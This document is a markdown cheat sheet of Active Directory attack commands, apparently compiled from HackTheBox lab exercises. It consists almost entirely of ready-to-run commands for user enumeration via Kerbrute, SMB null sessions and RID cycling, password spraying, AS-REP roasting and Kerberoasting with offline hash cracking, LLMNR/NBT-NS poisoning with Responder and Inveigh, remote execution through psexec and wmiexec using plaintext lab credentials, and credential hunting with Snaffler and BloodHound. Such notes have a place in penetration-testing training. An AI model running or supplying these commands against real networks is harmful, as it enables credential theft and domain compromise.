# Enumerating Users with Kerbrute -p88
```
kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt
```
```
https://github.com/ropnop/kerbrute/releases
```
```
kerbrute userenum /opt/SecLists/Usernames/cirt-default-usernames.txt --dc dc01.manager.htb -d manager.htb
```
```
./kerbrute userenum --dc <ip> -d <domainname> /usr/share/seclists/usernames/xato-net-10-millionusernames.txt
```
```
grep "VALID USERNAME" users.txt | sed -E 's/.* ([^@ ]+)@.*/\1/’
```
**Check out nmap DNS or DNS computer name to determine the --dc flag**
**Don't forget to add dc01 to your /etc/hosts file**
## Trying to login with passwords same as user
```
netexec smb manager.htb -u users -p users --continue-on-success --no-brute
```

# SMB NULL Session to Pull User List -p139,445
```
crackmapexec smb 172.16.5.5 --users
```
```
smbclient -N -L \\\\<target ip>
```
```
smbclient -L //10.10.10.178 -U ""
```
## enum4linux
```
enum4linux -U 172.16.5.5  | grep "user:" | cut -f2 -d"[" | cut -f1 -d"]"
```
We can try to see if we can log in as any of these users using a tool like the smb_login module in Metasploit
If we find a default Password we can try to login with it using the usernames found
We can put these users in a file, users.txt, and see if any of them have no password or a trivial password set. We will use the Metasploit module smb_login.
```
msf5 auxiliary(scanner/smb/smb_login) > set BLANK_PASSWORDS true
```
```
msf5 auxiliary(scanner/smb/smb_login) > set BLANK_PASSWORDS false
```
```
msf5 auxiliary(scanner/smb/smb_login) > set USER_AS_PASS true
```
# rpcclient
```
rpcclient -U "" -N 172.16.5.5
```
```
rpcclient $> enumdomusers 
```
## From the rpc enumeration users, We can try AES-Rep roasting
Save the users in a file called users.txt
```
for user in $(cat ../users.txt); do python3 GetNPUsers.py -no-pass -dc-ip 10.10.10.161 htb/${user} | grep -v Impacket; done
```
```
for user in $(cat ./users.txt); do impacket-GetNPUsers -no-pass -dc-ip 10.10.10.161 htb/${user} | grep -v Impacket; done 
```
### crack the $23$ hash with john
```
john --wordlist=/usr/share/wordlists/rockyou.txt svc_alfresco 
```
# Share Searching
try a RID cycling attack, by bruteforcing Windows user security identifiers (SIDs) by incrementing the relative identifier (RID) part. The Impacket script loopupside.py will do this nicely:
```
lookupsid.py 0xdf@manager.htb -no-pass
```
```
oxdf@hacky$ lookupsid.py 0xdf@manager.htb -no-pass | grep SidTypeUser | cut -d' ' -f2 | cut -d'\' -f2 | tr '[:upper:]' '[:lower:]' | tee users
```
# netexec
## User Enumeration
```
netexec smb 10.10.11.236 -u guest -p '' --rid-brute
```
## Trying to login with passwords same as user
```
netexec smb manager.htb -u users -p users --continue-on-success --no-brute
```
# Gathering Users with LDAP Anonymous -p389
## ldapsearch
```
ldapsearch -h 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "(&(objectclass=user))"  | grep sAMAccountName: | cut -f2 -d" "
```
Save the users to a file
You can create a custom password list and attempt to Password Spray
```
This above command is not working, check for any updates or modifications
```
```
ldapsearch -H ldap://dc01.manager.htb -x -s base namingcontexts
```
If you have valid credentials you can use ldapdomaindump to get the info 
```
oxdf@hacky$ ldapdomaindump -u management.htb\\operator -p 'operator' 10.10.11.236 -o ldap/
```
The user and password is operator in the above example
## windapsearch
```
./windapsearch.py --dc-ip 172.16.5.5 -u "" -U
```
# LLMNR/NBTS Poisoning
## Linux
```
ifconfig
```
```
sudo responder -I <interface name> -dwP
```
```
hashcat -m 5600 <file containing hash> /usr/share/wordlists/rockyou.txt
```
## Enumerating the Password Policy - from Linux - Credentialed
```
crackmapexec smb 172.16.5.5 -u avazquez -p Password123 --pass-pol
```
# Windows
```
Import-Module .\Inveigh.ps1
```
```
Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput Y
```
## C# Inveigh (InveighZero)
```
.\Inveigh.exe
```
```
GET NTLMV2UNIQUE
```
```
GET NTLMV2USERNAMES
```
# Credentialed Enumeration - from Linux
## CrackMapExec
### Domain User Enumeration
```
sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --users
```
### Domain Group Enumeration
```
sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --groups
```
### Logged On Users
```
sudo crackmapexec smb 172.16.5.130 -u forend -p Klmcargo2 --loggedon-users
```
### Share Searching
```
sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --shares
```
try a RID cycling attack, by bruteforcing Windows user security identifiers (SIDs) by incrementing the relative identifier (RID) part. The Impacket script loopupside.py will do this nicely:
```
netexec smb 10.10.11.236 -u guest -p '' --rid-brute
```
```
lookupsid.py 0xdf@manager.htb -no-pass
```
```
oxdf@hacky$ lookupsid.py 0xdf@manager.htb -no-pass | grep SidTypeUser | cut -d' ' -f2 | cut -d'\' -f2 | tr '[:upper:]' '[:lower:]' | tee users
```

### Spider_plus run against a specific share
```
sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 -M spider_plus --share 'Department Shares’
```
```
head -n 10 /tmp/cme_spider_plus/172.16.5.5.json 
```
### Password Spraying without bruteforce
```
crackmapexec <protocol> <target(s)> -u ~/file_containing_usernames -H ~/file_containing_ntlm_hashes --no-bruteforce
```
```
crackmapexec <protocol> <target(s)> -u ~/file_containing_usernames -p ~/file_containing_passwords --no-bruteforce
```
## SMBMap
### Check Access
```
smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5
```
**CASE SENSITIVE FOR DOMAIN**
### Recursive List Of All Directories
```
smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5 -R 'Department Shares' --dir-only
```
## rpcclient
```
rpcclient -U "" -N 172.16.5.5
```
### User Enumeration By RID
```
enumdomusers
```
```
queryuser <RID>
```
## Impacket
### Psexec.py
```
psexec.py inlanefreight.local/wley:'transporter@4'@172.16.5.125  
```
### wmiexec.py
```
wmiexec.py inlanefreight.local/wley:'transporter@4'@172.16.5.5
```
### Get-UserSPNs
```
impacket-GetUserSPNs -dc-ip 10.10.10.100 ACTIVE.HTB/svc_tgs -request
```
## Windapsearch 
#### Domain Admins
```
python3 windapsearch.py --dc-ip 172.16.5.5 -u forend@inlanefreight.local -p Klmcargo2 --da
```
#### Privileged Users
```
python3 windapsearch.py --dc-ip 172.16.5.5 -u forend@inlanefreight.local -p Klmcargo2 -PU
```
## ASREPRoasting
### Linux
```
root@kali:~# GetNPUsers.py EGOTISTICAL-BANK.LOCAL/ -usersfile users.txt -dc-ip 10.10.10.175
```
We could get a list of the users from the website or from enum4linux
#### Cracking the Hash Offline with Hashcat
```
hashcat -m 18200 ilfreight_asrep /usr/share/wordlists/rockyou.txt
```
you can add -format hashcat to the above command
## ldapsearch
If you have valid credentials you can use ldapdomaindump to get the info 
```
oxdf@hacky$ ldapdomaindump -u management.htb\\operator -p 'operator' 10.10.11.236 -o ldap/
```
The user and password is operator in the above example
## You can run bloodhound-python if nothing works 
```
bloodhound-python -u support -p '#00^BlackKnight' -ns 10.10.10.192 -d blackfield.local -c all
```
# Credentialed Enumeration - from Windows
## Get-Module
```
Import-Module ActiveDirectory
```
## ActiveDirectory PowerShell module
### Get Domain Info
This will print out helpful information like the domain SID, domain functional level, any child domains
```
PS C:\htb> Get-ADDomain
```
### get a listing of accounts that may be susceptible to a Kerberoasting attack
```
Get-ADUser
```
filtering for accounts with the ServicePrincipalName
```
PS C:\htb> Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName
```
### Checking For Trust Relationships
```
PS C:\htb> Get-ADTrust -Filter *
```
### Group Enumeration
```
PS C:\htb> Get-ADGroup -Filter * | select name
```
We can take the results and feed interesting names back into the cmdlet to get more detailed information about a particular group like so:
#### Detailed Group Info
```
PS C:\htb> Get-ADGroup -Identity "Backup Operators"
```
#### Group Membership
```
PS C:\htb> Get-ADGroupMember -Identity "Backup Operators"
```
## PowerView
### Domain User Information (mmorgan example)
PS C:\htb> Get-DomainUser -Identity sflowers -Domain outdated.htb | Select-Object -Property name,samaccountname,description,memberof,whencreated,pwdlastset,lastlogontimestamp,accountexpires,admincount,userprincipalname,serviceprincipalname,useraccountcontrol
### Recursive Group Membership
enumerate some domain group information. Adding the -Recurse switch tells PowerView that if it finds any groups that are part of the target group (nested group membership) to list out the members of those groups. 
```
PS C:\htb>  Get-DomainGroupMember -Identity "Domain Admins" -Recurse
```
### Trust Enumeration
```
PS C:\htb> Get-DomainTrustMapping
```
### Testing for Local Admin Access
```
PS C:\htb> Test-AdminAccess -ComputerName ACADEMY-EA-MS01
```
### Finding Users With SPN Set
indicates that the account may be subjected to a Kerberoasting attack.
```
PS C:\htb> Get-DomainUser -SPN -Properties samaccountname,ServicePrincipalName
```
## SharpView
### enumerate information about a specific user (forend example)
```
PS C:\htb> .\SharpView.exe Get-DomainUser -Identity forend
```
## Snaffler
### Snaffler Execution
```
Snaffler.exe -s -d inlanefreight.local -o snaffler.log -v data
```
We may find passwords, SSH keys, configuration files, or other data that can be used to further our access. Snaffler color codes the output for us and provides us with a rundown of the file types found in the shares.
**Exremely Important for retreiving passwords**
## SharpHound
```
PS C:\htb> .\SharpHound.exe -c All --zipfilename ILFREIGHT
```
1. exfiltrate the dataset to our own VM or ingest it into the BloodHound GUI
2. click on the Upload Data button on the right-hand side, select the newly generated zip file, and click Open. An Upload Progress window will pop up. Once all .json files show 100% complete, click the X at the top of that window.
3. we can see that all Domain Users have RDP access over the DEV01 host. This means that any user in the domain can RDP in and, if they can escalate privileges, could potentially steal sensitive data such as credentials. This is worth noting as a finding; we can call it Excessive Active Directory Group Privileges and label it medium-risk. If the entire group had local admin rights over a host, it would definitely be a high-risk finding.